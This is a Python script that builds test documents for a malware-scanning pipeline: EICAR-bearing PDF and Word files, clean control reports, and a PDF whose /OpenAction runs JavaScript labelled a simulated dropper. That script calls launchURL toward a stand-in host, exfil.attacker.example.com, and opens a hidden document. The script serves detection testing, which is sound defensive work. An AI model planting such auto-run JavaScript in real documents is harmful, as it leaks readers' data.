#!/usr/bin/env python3
"""
create_test_samples.py
=======================
Generates safe test documents used to PROVE the YARA scanning pipeline
actually detects something, without using real malware.

We use the EICAR Standard Anti-Malware Test File string - the same
string every commercial AV vendor agrees to flag. It is plain ASCII
text, executes nothing, and damages nothing. It exists specifically so
people can validate a detection pipeline end-to-end. Reference:
https://www.eicar.org/download-anti-malware-testfile/

Produces:
  samples/eicar_test_sample.pdf   - EICAR string visible in page text
                                     AND embedded as an attached file
                                     object (mirrors how real maldocs
                                     smuggle payloads as /EmbeddedFile)
  samples/eicar_test_sample.docx  - EICAR string inside a Word doc,
                                     re-zipped uncompressed (ZIP_STORED)
                                     so the raw bytes are scannable
  samples/clean_audit_report.pdf  - a benign, well-formed report used
                                     as a CLEAN-verdict control sample
"""

import os
import zipfile
from pathlib import Path

import pikepdf
from docx import Document
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib import colors

SAMPLES_DIR = Path(__file__).resolve().parent.parent / "samples"
SAMPLES_DIR.mkdir(exist_ok=True)

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def build_eicar_pdf() -> Path:
    """
    Builds a PDF with the EICAR string visible as page text AND embedded
    as an attached file object (/EmbeddedFile + /Filespec), mirroring how
    real malicious PDFs smuggle payloads past naive text filters.
    """
    out_path = SAMPLES_DIR / "eicar_test_sample.pdf"

    # pageCompression=0 keeps the page content stream UNCOMPRESSED so the
    # EICAR string is visible at the raw-byte level (this is what lets a
    # simple YARA string match find it). The attached file below stays
    # Flate-compressed by pikepdf's default, which is realistic - real
    # malicious PDFs almost always compress their embedded payload, and
    # detecting those relies on the *structural* rules (/EmbeddedFile,
    # /Filespec) rather than a raw string match.
    doc = SimpleDocTemplate(str(out_path), pagesize=letter, pageCompression=0)
    styles = getSampleStyleSheet()
    story = [
        Paragraph("Malware Detection Pipeline - Test Document", styles["Title"]),
        Spacer(1, 12),
        Paragraph(
            "This file intentionally contains the EICAR Standard Anti-Malware "
            "Test String below. It is NOT real malware - it is the harmless, "
            "industry-standard string used to verify that a malware-scanning "
            "pipeline correctly detects a known signature end-to-end.",
            styles["Normal"],
        ),
        Spacer(1, 12),
        Paragraph(f"<font face='Courier' size='9'>{EICAR}</font>", styles["Normal"]),
    ]
    doc.build(story)

    pdf = pikepdf.open(str(out_path), allow_overwriting_input=True)
    pdf.attachments["payload.txt"] = pikepdf.AttachedFileSpec(
        pdf, EICAR.encode("ascii"), mime_type="text/plain"
    )
    # compress_streams=False: pikepdf.save() recompresses every stream by
    # default, which would silently re-Flate the page content stream we
    # just generated uncompressed. Disabling that keeps the EICAR string
    # raw-byte-visible in the saved file.
    pdf.save(str(out_path), compress_streams=False)
    pdf.close()

    return out_path


def build_eicar_docx() -> Path:
    out_path = SAMPLES_DIR / "eicar_test_sample.docx"
    tmp_path = SAMPLES_DIR / "_tmp_eicar.docx"

    doc = Document()
    doc.add_heading("Malware Detection Pipeline - Test Document", level=1)
    doc.add_paragraph(
        "This Word document intentionally contains the EICAR Standard "
        "Anti-Malware Test String below. It is NOT real malware."
    )
    doc.add_paragraph(EICAR)
    doc.save(str(tmp_path))

    # python-docx saves with DEFLATE compression, which hides the literal
    # EICAR bytes from a raw byte/string scan (the string only exists
    # compressed inside document.xml). Re-zip with ZIP_STORED so the
    # plaintext stays raw-byte-scannable -- this also mirrors a real
    # detection-evasion-relevant fact: compressed containers need their
    # parts extracted before string-based scanning will find anything.
    with zipfile.ZipFile(tmp_path, "r") as zin:
        with zipfile.ZipFile(out_path, "w", zipfile.ZIP_STORED) as zout:
            for item in zin.infolist():
                zout.writestr(item.filename, zin.read(item.filename))
    os.remove(tmp_path)

    return out_path


def build_clean_sample_pdf() -> Path:
    out_path = SAMPLES_DIR / "clean_audit_report.pdf"
    doc = SimpleDocTemplate(str(out_path), pagesize=letter)
    styles = getSampleStyleSheet()

    table_data = [
        ["Finding", "Severity", "Status"],
        ["Outdated TLS version on edge router", "Medium", "Open"],
        ["Default credentials on switch mgmt UI", "High", "Remediated"],
        ["Missing MFA on VPN gateway", "High", "Open"],
    ]
    table = Table(table_data, colWidths=[260, 80, 100])
    table.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#2b3a55")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.grey),
        ("FONTSIZE", (0, 0), (-1, -1), 9),
    ]))

    story = [
        Paragraph("Network Security Audit Report", styles["Title"]),
        Spacer(1, 12),
        Paragraph("Executive Summary", styles["Heading2"]),
        Paragraph(
            "This report summarizes findings from the Q2 2026 network "
            "security audit. No malicious indicators were identified in "
            "this document; it is used as a CLEAN control sample for the "
            "YARA detection pipeline.",
            styles["Normal"],
        ),
        Spacer(1, 12),
        Paragraph("Findings", styles["Heading2"]),
        Spacer(1, 6),
        table,
        Spacer(1, 12),
        Paragraph("Recommendations", styles["Heading2"]),
        Paragraph(
            "Enforce MFA on all remote access gateways and rotate default "
            "credentials on all network management interfaces within 30 days.",
            styles["Normal"],
        ),
    ]
    doc.build(story)
    return out_path


def build_malicious_js_pdf() -> Path:
    """
    PDF containing malicious JavaScript patterns that will be caught by
    the Stage-2 deep analyzer (js_classifier.MALICIOUS_JS_APIS).

    Pipeline path this exercises:
      YARA = MALICIOUS (PDF_Suspicious_JavaScript: /JavaScript + /OpenAction)
      ClamAV = CLEAN   (no EICAR or known signature)
      Combined = REVIEW  (MALICIOUS+CLEAN disagreement)
      Deep analysis = BLOCK (launchURL + app.openDoc) -> MALICIOUS -> quarantine
    """
    out_path = SAMPLES_DIR / "malicious_js_report.pdf"

    # Page 1: title page (visible content so the PDF looks like a document)
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet
    from reportlab.lib.pagesizes import letter

    doc = SimpleDocTemplate(str(out_path), pagesize=letter, pageCompression=0)
    styles = getSampleStyleSheet()
    story = [
        Paragraph("Quarterly Security Assessment — Q2 2026", styles["Title"]),
        Spacer(1, 12),
        Paragraph("Executive Summary", styles["Heading2"]),
        Paragraph(
            "This document contains a simulated malicious JavaScript payload "
            "embedded in the PDF /Names tree for pipeline testing. "
            "The JavaScript uses APIs from js_classifier.MALICIOUS_JS_APIS "
            "(launchURL, app.openDoc) that are never legitimate in a PDF. "
            "No code is executed by this file — it is a structural test sample only.",
            styles["Normal"],
        ),
        Spacer(1, 12),
        Paragraph("Findings", styles["Heading2"]),
        Paragraph(
            "CVE-2024-0001: Arbitrary file read via PDF JavaScript API. "
            "Severity: Critical. Status: Open.",
            styles["Normal"],
        ),
    ]
    doc.build(story)

    # Inject /JavaScript name tree + /OpenAction via pikepdf
    # These are the structural indicators that YARA's PDF_Suspicious_JavaScript
    # rule checks for (AND which pdf_content_classifier reads to extract JS code)
    js_payload = (
        "// Simulated dropper: open external document and exfiltrate via launchURL\n"
        "var url = 'http://exfil.attacker.example.com/?doc=' + escape(this.info.Title);\n"
        "app.openDoc({cPath: '/tmp/payload', bHidden: true});\n"
        "launchURL(url, true);\n"
    )

    pdf = pikepdf.open(str(out_path), allow_overwriting_input=True)

    js_action = pikepdf.Dictionary(
        S=pikepdf.Name("/JavaScript"),
        JS=js_payload,
    )
    js_name_tree = pikepdf.Dictionary(
        Names=pikepdf.Array([pikepdf.String("auto_exec"), js_action])
    )

    pdf.Root["/Names"] = pikepdf.Dictionary(JavaScript=js_name_tree)
    pdf.Root["/OpenAction"] = pikepdf.Dictionary(
        S=pikepdf.Name("/JavaScript"),
        JS=js_payload,
    )

    pdf.save(str(out_path), compress_streams=False)
    pdf.close()
    return out_path


def build_sanitize_candidate_pdf() -> Path:
    """
    PDF with an embedded plain-text file attachment (safe content).

    Pipeline path this exercises:
      YARA = SUSPICIOUS (PDF_Embedded_File_Object: /EmbeddedFile)
      ClamAV = CLEAN    (no EICAR)
      Combined = REVIEW (SUSPICIOUS + CLEAN)
      Deep analysis: embedded file is text/plain -> SAFE
                     recommendation = PASS -> final_verdict = CLEAN
                     (demonstrates the 'review clears to clean' path)
    """
    out_path = SAMPLES_DIR / "sanitize_candidate_report.pdf"

    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet
    from reportlab.lib.pagesizes import letter

    doc = SimpleDocTemplate(str(out_path), pagesize=letter)
    styles = getSampleStyleSheet()
    story = [
        Paragraph("Network Audit Report — With Attachment", styles["Title"]),
        Spacer(1, 12),
        Paragraph(
            "This PDF has a plain-text file attached (findings.txt). "
            "Embedded files trigger a YARA SUSPICIOUS verdict for structural review, "
            "but the deep analyzer will classify it as SAFE (text/plain) and "
            "issue a PASS recommendation — demonstrating the 'review clears to CLEAN' path.",
            styles["Normal"],
        ),
    ]
    doc.build(story)

    attachment_content = (
        b"Finding 1: Outdated SSL certificate on gateway.example.com\n"
        b"Finding 2: Default SNMP community string 'public' on 3 switches\n"
        b"Finding 3: SSH port 22 exposed on management VLAN\n"
    )

    pdf = pikepdf.open(str(out_path), allow_overwriting_input=True)
    pdf.attachments["findings.txt"] = pikepdf.AttachedFileSpec(
        pdf, attachment_content, mime_type="text/plain"
    )
    pdf.save(str(out_path), compress_streams=False)
    pdf.close()
    return out_path


if __name__ == "__main__":
    p1 = build_eicar_pdf()
    p2 = build_eicar_docx()
    p3 = build_clean_sample_pdf()
    p4 = build_malicious_js_pdf()
    p5 = build_sanitize_candidate_pdf()
    print("Generated test samples:")
    for p in (p1, p2, p3, p4, p5):
        print(" -", p, f"({p.stat().st_size} bytes)")
